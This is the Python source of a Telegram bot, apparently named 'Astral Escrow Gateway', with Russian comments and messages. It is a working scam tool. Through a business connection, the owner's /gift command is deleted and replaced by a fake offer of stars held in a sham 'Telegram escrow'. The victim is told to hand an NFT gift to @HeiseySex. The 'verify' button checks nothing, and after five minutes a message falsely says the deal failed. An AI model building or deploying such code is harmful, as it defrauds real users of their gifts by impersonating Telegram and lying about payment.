import os
import re
import sys
import asyncio
import logging
from typing import Optional, Tuple

from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramAPIError
from fastapi import FastAPI
import uvicorn

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("[FATAL] BOT_TOKEN is missing.")

OWNER_ID = 861423393
TARGET_URL = "https://t.me/HeiseySex"
VERIFY_TIMEOUT = 300  # 5 минут

# ─────────────────────── ЛОГИ (в stdout, чтобы Render их видел) ───────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("astral.core")

# ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
app = FastAPI(title="Astral Escrow Gateway")

active_offers = {}

# ─────────────────────── ЯДРО ПАРСИНГА ───────────────────────

def extract_offer_data(text: str) -> Optional[Tuple[str, str, str]]:
    """
    Принимает:
      /gift "Название" "ссылка" 100
      /gift "Название" "ссылка" "100"
      /gift Название ссылка 100
    Возвращает (name, url, amount) или None.
    """
    # Убираем /gift и возможный @username
    text = re.sub(r'^/gift(?:@\w+)?', '', text).strip()
    if not text:
        return None

    quoted = re.findall(r'"([^"]*)"', text)

    if len(quoted) >= 2:
        name, url = quoted[0], quoted[1]
        # Убираем ВСЕ значения в кавычках и ищем первое число в остатке
        remainder = re.sub(r'"[^"]*"', '', text).strip()
        amount_match = re.search(r"\d+", remainder)
        amount = amount_match.group(0) if amount_match else None
    else:
        tokens = text.split()
        if len(tokens) < 3:
            return None
        name, url = tokens[0], tokens[1]
        amount_match = re.search(r"\d+", tokens[2])
        amount = amount_match.group(0) if amount_match else None

    if not all([name, url, amount]):
        return None

    url_clean = url if url.startswith("http") else f"https://t.me/{url.lstrip('@/')}"
    return name, url_clean, amount


# ─────────────────────── ИНТЕРФЕЙСЫ ───────────────────────

def get_offer_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Принять", callback_data="stage_accept"),
         InlineKeyboardButton(text="❌ Отклонить", callback_data="stage_decline")]
    ])


def get_escrow_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Передать подарок", url=TARGET_URL)],
        [InlineKeyboardButton(text="⚡ Подтвердить", callback_data="stage_verify"),
         InlineKeyboardButton(text="❌ Отменить", callback_data="stage_decline")]
    ])


# ─────────────────────── ХЕЛПЕРЫ ───────────────────────

async def safe_delete(chat_id: int, message_id: int, conn_id: Optional[str]):
    """Безопасное удаление с учётом business_connection_id."""
    try:
        if conn_id:
            await bot.delete_message(
                chat_id=chat_id,
                message_id=message_id,
                business_connection_id=conn_id,
            )
        else:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        logger.info(f"[DELETE] {message_id} удалено")
    except TelegramAPIError as e:
        if "message to delete not found" in str(e):
            logger.info(f"[DELETE] {message_id} уже отсутствует")
        else:
            logger.warning(f"[DELETE] Ошибка: {e}")


async def safe_answer(message: Message, text: str, **kwargs):
    """Безопасная отправка сообщения."""
    try:
        return await message.answer(text, **kwargs)
    except TelegramAPIError as e:
        err = str(e)
        logger.error(f"[SEND] Ошибка: {err}")
        if "PRIVACY_PREMIUM_REQUIRED" in err:
            logger.error("  → У собеседника включён Premium-фильтр.")
        elif "CHAT_WRITE_FORBIDDEN" in err:
            logger.error("  → Собеседник запретил сообщения от ботов.")
        elif "USER_IS_BLOCKED" in err:
            logger.error("  → Ты заблокирован.")
        elif "PEER_FLOOD" in err:
            logger.error("  → Спам-блок Telegram.")
        return None


async def safe_edit(call: CallbackQuery, text: str, **kwargs):
    """Безопасное редактирование сообщения."""
    try:
        return await call.message.edit_text(text, **kwargs)
    except TelegramAPIError as e:
        logger.warning(f"[EDIT] Ошибка: {e}")
        return None


# ─────────────────────── РОУТИНГ TELEGRAM ───────────────────────

@router.message(F.text.startswith("/start"))
async def cmd_start(message: Message):
    conn_id = getattr(message, "business_connection_id", None)
    logger.info(f"[START] От {message.from_user.id} | conn_id={conn_id}")
    await safe_answer(
        message,
        "Система активна. Формат: /gift \"Название\" \"Ссылка\" 100",
        business_connection_id=conn_id,
    )


@router.message(F.text.startswith("/gift"))
async def cmd_gift(message: Message):
    conn_id = getattr(message, "business_connection_id", None)
    sender_id = message.from_user.id

    logger.info(f"[GIFT] От {sender_id} | conn_id={conn_id} | text={message.text!r}")

    # Реагируем только на владельца
    if sender_id != OWNER_ID:
        logger.info(f"[GIFT] Игнорирую — sender_id != OWNER_ID")
        return

    parsed = extract_offer_data(message.text)
    if not parsed:
        if conn_id:
            await safe_answer(message, "❌ Ошибка формата.", business_connection_id=conn_id)
        return

    name, url, amount = parsed
    logger.info(f"[GIFT] name={name!r}, url={url!r}, amount={amount!r}")

    text = (
        "Вам поступило предложение о покупке подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
        f"<a href=\"{url}\">{name}</a>.\n\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    # Удаляем команду /gift
    await safe_delete(message.chat.id, message.message_id, conn_id)

    # Отправляем оффер
    sent = await safe_answer(
        message,
        text,
        reply_markup=get_offer_kb(),
        business_connection_id=conn_id,
    )

    if sent is None:
        logger.error("[GIFT] Не удалось отправить оффер.")
        return

    active_offers[sent.message_id] = {
        "name": name,
        "url": url,
        "amount": amount,
        "conn_id": conn_id,
    }
    logger.info(f"[GIFT] Оффер отправлен: msg_id={sent.message_id}")


@router.callback_query(F.data.in_({"stage_accept", "stage_decline", "stage_verify"}))
async def handle_callbacks(call: CallbackQuery):
    logger.info(f"[CALLBACK] {call.data} от {call.from_user.id}")

    offer = active_offers.get(call.message.message_id)
    if not offer:
        await call.answer("Сессия не найдена.", show_alert=True)
        return

    conn_id = offer["conn_id"]

    # ── Принять ──
    if call.data == "stage_accept":
        await call.answer("Ознакомьтесь с инструкцией.", show_alert=True)

        text = (
            f"Пользователь зарезервировал <b>{offer['amount']}</b> ⭐ через "
            "эксроу-систему Telegram. Средства хранятся на специальном "
            "эксроу-счёте и будут автоматически зачислены на ваш баланс "
            "звёзд сразу после передачи подарка.\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "<b>Инструкция для завершения сделки:</b>\n\n"
            f"1. Передайте подарок пользователю: @HeiseySex\n"
            f"2. Нажмите «Передать NFT» и выберите "
            f"<a href=\"{offer['url']}\">{offer['name']}</a>\n"
            "3. Подтвердите передачу подарка.\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Telegram зафиксирует транзакцию и моментально зачислит "
            f"<b>{offer['amount']}</b> ⭐ на ваш баланс."
        )

        await safe_edit(
            call,
            text,
            reply_markup=get_escrow_kb(),
            business_connection_id=conn_id,
        )

    # ── Подтвердить ──
    elif call.data == "stage_verify":
        await call.answer("Проверка транзакции...")

        await safe_edit(
            call,
            "⏳ <b>Проверка передачи…</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Система проверяет статус передачи подарка. "
            "Это может занять несколько минут.\n\n"
            "Пожалуйста, не закрывайте чат.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            business_connection_id=conn_id,
        )

        asyncio.create_task(verify_timeout(call.message, conn_id))

    # ── Отклонить / Отменить ──
    elif call.data == "stage_decline":
        await call.answer("Отклонено.")

        await safe_edit(
            call,
            "❌ <b>Предложение отклонено.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Сессия закрыта. Если вы передумаете, "
            "пользователь может отправить предложение повторно.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            business_connection_id=conn_id,
        )


async def verify_timeout(message: Message, conn_id: Optional[str]):
    """Через VERIFY_TIMEOUT секунд меняет сообщение на 'сделка не завершена'."""
    await asyncio.sleep(VERIFY_TIMEOUT)
    try:
        kwargs = {
            "chat_id": message.chat.id,
            "message_id": message.message_id,
        }
        if conn_id:
            kwargs["business_connection_id"] = conn_id

        await bot.edit_message_text(
            "⛔ <b>Сделка не завершена.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Вы не выполнили все условия передачи подарка.\n\n"
            "Передача не была подтверждена в установленное время, "
            "поэтому резерв средств был снят, а предложение — "
            "автоматически аннулировано.\n\n"
            "Если вы всё ещё хотите завершить сделку, попросите "
            "пользователя отправить предложение повторно.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            **kwargs,
        )
        logger.info(f"[VERIFY-TIMEOUT] msg {message.message_id} обновлён")
    except TelegramAPIError as e:
        logger.warning(f"[VERIFY-TIMEOUT] Не удалось: {e}")


# ─────────────────────── BUSINESS CONNECTION (для логов) ───────────────────────

@router.business_connection()
async def on_business_connection(connection):
    logger.info(f"[BUSINESS] Соединение: {connection.id}")
    logger.info(f"[BUSINESS] Владелец: {connection.user.id}")
    logger.info(f"[BUSINESS] Активно: {connection.is_enabled}")


# ─────────────────────── WEB SERVER API ───────────────────────

@app.get("/health")
async def health_check():
    return {"status": "operational", "active_offers": len(active_offers)}


# ─────────────────────── ЗАПУСК ───────────────────────

async def main():
    dp.include_router(router)

    config = uvicorn.Config(
        app,
        host="0.0.0.0",
        port=int(os.getenv("PORT", 10000)),
        log_level="warning",
    )
    server = uvicorn.Server(config)

    logger.info("Igniting ASGI Server and Telegram Polling concurrently...")

    await asyncio.gather(
        server.serve(),
        dp.start_polling(
            bot,
            allowed_updates=[
                "message",
                "callback_query",
                "business_connection",
                "business_message",
                "edited_business_message",
                "deleted_business_messages",
            ],
        ),
    )


if __name__ == "__main__":
    asyncio.run(main())
